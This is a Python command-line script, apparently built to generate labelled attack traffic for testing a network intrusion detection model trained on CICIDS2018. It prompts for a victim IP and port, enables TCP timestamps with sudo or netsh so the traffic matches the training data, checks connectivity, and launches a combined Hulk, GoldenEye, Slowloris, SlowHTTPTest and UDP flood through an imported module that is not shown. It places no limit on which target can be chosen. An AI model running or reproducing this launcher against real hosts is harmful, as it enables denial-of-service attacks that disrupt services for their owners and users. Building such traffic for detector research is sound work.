#!/usr/bin/env python
"""
DoS Attack CLI — Interactive Mode
Asks for target IP, HTTP port, and duration at runtime.

Currently supports DoS only (Hulk, Slowloris, GoldenEye, SlowHTTPTest, UDP).
Other attack types will be added later.

Usage:
    python device_attack.py                  # Interactive: prompts for IP + port
    python device_attack.py --duration 300   # 5-minute attack
    python device_attack.py --help           # Show options
"""

import sys
import os
import time
import argparse
import socket
import platform
import subprocess

# Add current directory to path so _1_dos_attack can be imported
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

DEFAULTS = {"duration": 300}


# ─── TCP Timestamps ──────────────────────────────────────
def check_and_enable_tcp_timestamps():
    """Check and enable TCP timestamps on the attacker machine.

    CRITICAL for classification accuracy:
    - Fwd Seg Size Min is the #1 feature (9.3% importance)
    - CICIDS2018 training data had TCP timestamps ON (Linux/Kali)
    - Timestamps add 12 bytes to TCP header: 20 → 32
    - Without them Fwd Seg Size Min = 20, model expects 32 → misclassified
    """
    os_name = platform.system()

    if os_name == "Windows":
        print("[*] Checking TCP timestamps (CRITICAL for classification)...")
        try:
            result = subprocess.run(
                ["netsh", "int", "tcp", "show", "global"],
                capture_output=True, text=True, timeout=10,
            )
            output = result.stdout.lower()

            if "timestamps" in output and "enabled" in output:
                print("[OK] TCP timestamps are ENABLED\n")
                return True

            print("[!] TCP timestamps appear DISABLED — attempting to enable...")
            try:
                r = subprocess.run(
                    ["netsh", "int", "tcp", "set", "global", "timestamps=enabled"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0:
                    print("[OK] TCP timestamps ENABLED successfully!\n")
                    return True
                else:
                    print("[!] Failed (need Administrator). Run manually:")
                    print("    netsh int tcp set global timestamps=enabled\n")
                    return False
            except Exception as e:
                print(f"[!] Error enabling timestamps: {e}")
                print("    netsh int tcp set global timestamps=enabled\n")
                return False

        except Exception as e:
            print(f"[!] Error checking timestamps: {e}")
            print("    netsh int tcp set global timestamps=enabled\n")
            return False

    elif os_name == "Linux":
        try:
            with open("/proc/sys/net/ipv4/tcp_timestamps", "r") as f:
                val = f.read().strip()
            if val == "1":
                print("[OK] TCP timestamps are enabled (Linux)\n")
                return True
            print("[!] Enabling TCP timestamps...")
            os.system("sudo sysctl -w net.ipv4.tcp_timestamps=1")
            return True
        except Exception:
            print("[?] Could not check TCP timestamps on Linux\n")
            return True

    return True


# ─── Connectivity Pre-Check ──────────────────────────────
def check_connectivity(target_ip, target_port, timeout=5):
    """Try a single TCP connection to the victim BEFORE launching the attack.
    Returns True if connection succeeds, False otherwise.
    Prints clear diagnostic info so the user knows what went wrong.
    """
    print(f"\n[*] ── Connectivity Pre-Check ─────────────────────")
    print(f"[*] Testing TCP connection to {target_ip}:{target_port} ...")

    # 1. Quick ICMP-style reachability (ping)
    os_name = platform.system()
    ping_cmd = ["ping", "-n", "1", "-w", "2000", target_ip] if os_name == "Windows" \
        else ["ping", "-c", "1", "-W", "2", target_ip]
    try:
        ping_result = subprocess.run(ping_cmd, capture_output=True, text=True, timeout=5)
        if ping_result.returncode == 0:
            print(f"[OK] Ping to {target_ip} succeeded")
        else:
            print(f"[!!] Ping to {target_ip} FAILED — host may be unreachable or ICMP blocked")
            print(f"     (continuing anyway — ICMP may be blocked by firewall)")
    except Exception as e:
        print(f"[!!] Ping error: {e}")

    # 2. TCP connection test
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target_ip, target_port))
        sock.close()
        print(f"[OK] TCP connect to {target_ip}:{target_port} SUCCEEDED")
        print(f"[*] ─────────────────────────────────────────────\n")
        return True
    except socket.timeout:
        print(f"[!!] TCP connect to {target_ip}:{target_port} TIMED OUT after {timeout}s")
        print(f"     Possible causes:")
        print(f"       - Target IP is wrong or host is down")
        print(f"       - Firewall is blocking port {target_port}")
        print(f"       - No service listening on port {target_port}")
    except ConnectionRefusedError:
        print(f"[!!] TCP connect to {target_ip}:{target_port} REFUSED")
        print(f"     The host is reachable but nothing is listening on port {target_port}")
        print(f"     Make sure an HTTP server is running on the victim")
    except OSError as e:
        print(f"[!!] TCP connect to {target_ip}:{target_port} FAILED: {e}")
        print(f"     Possible causes:")
        print(f"       - Target IP is wrong / host is down")
        print(f"       - Network not configured / no route to host")

    print(f"[*] ─────────────────────────────────────────────\n")

    # Ask user whether to continue anyway
    resp = input("[?] Connection failed. Continue with attack anyway? (y/N): ").strip().lower()
    return resp in ("y", "yes")


# ─── Import DoS module ───────────────────────────────────
from _1_dos_attack import run_dos


# ─── Prompts ─────────────────────────────────────────────
def prompt_for_ip():
    """Prompt user for target IP address."""
    while True:
        ip = input("\n[?] Enter target (victim) IP address: ").strip()
        if not ip:
            print("[-] IP cannot be empty")
            continue
        try:
            socket.inet_aton(ip)
            return ip
        except socket.error:
            print("[-] Invalid IP address format")


def prompt_for_port():
    """Prompt user for the HTTP target port (DoS only needs one port)."""
    while True:
        port_str = input("[?] Enter target HTTP port (default 80): ").strip()
        if not port_str:
            print("    -> Using default HTTP port: 80")
            return 80
        try:
            port = int(port_str)
            if 1 <= port <= 65535:
                print(f"    -> HTTP port set to: {port}")
                return port
            print("[-] Port must be between 1 and 65535")
        except ValueError:
            print("[-] Invalid port number")


# ─── Main ────────────────────────────────────────────────
def parse_args():
    parser = argparse.ArgumentParser(
        description="NIDS DoS Attack Generator — Interactive Mode",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--duration", type=int, default=DEFAULTS["duration"],
        help=f"Attack duration in seconds (default: {DEFAULTS['duration']})",
    )
    parser.add_argument(
        "--threads", type=int, default=10,
        help="Number of attack threads (default: 10)",
    )
    return parser.parse_args()


def main():
    print("=" * 55)
    print("  NIDS Attack Generator — DoS Only")
    print("=" * 55)
    print()

    args = parse_args()

    # 1. TCP timestamps
    check_and_enable_tcp_timestamps()

    # 2. Target info
    target_ip = prompt_for_ip()
    target_port = prompt_for_port()

    # 3. Connectivity pre-check
    if not check_connectivity(target_ip, target_port):
        print("[-] Aborting — fix connectivity first.")
        sys.exit(1)

    # 4. Launch DoS
    print(f"[*] Starting DoS attack on {target_ip}:{target_port}")
    print(f"[*] Duration: {args.duration}s | Threads: {args.threads}")
    print(f"[*] Techniques: Hulk(4T) + GoldenEye(3T) + Slowloris + SlowHTTPTest + UDP")
    print(f"[*] Press Ctrl+C to stop\n")

    try:
        run_dos(target_ip, target_port=target_port,
                duration=args.duration, threads=args.threads)
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

    print("\n[+] DoS attack completed!")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[FATAL ERROR] {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
